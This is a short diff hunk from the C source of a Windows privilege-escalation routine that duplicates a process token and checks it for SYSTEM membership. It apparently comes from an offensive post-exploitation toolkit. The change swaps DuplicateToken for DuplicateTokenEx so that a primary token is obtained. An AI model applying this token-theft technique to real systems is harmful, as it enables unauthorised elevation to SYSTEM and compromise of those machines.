@@ -37,8 +37,8 @@ BOOL elevator_tokendup( DWORD dwThreadId, DWORD dwSecurityRID )
 		if( !AllocateAndInitializeSid( &NtAuthority, 1, dwSecurityRID, 0, 0, 0, 0, 0, 0, 0, &lpSystemSID ) )
 			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. AllocateAndInitializeSid failed" );
 
-		if( !DuplicateToken( hProcessToken, SecurityImpersonation, &hToken ) )
-			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. DuplicateToken failed" );
+		if( !DuplicateTokenEx( hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hToken ) )
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. DuplicateTokenEx failed" );
 
 		if( !pCheckTokenMembership( hToken, lpSystemSID, &bIsSystem ) )
 			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. CheckTokenMembership failed" );
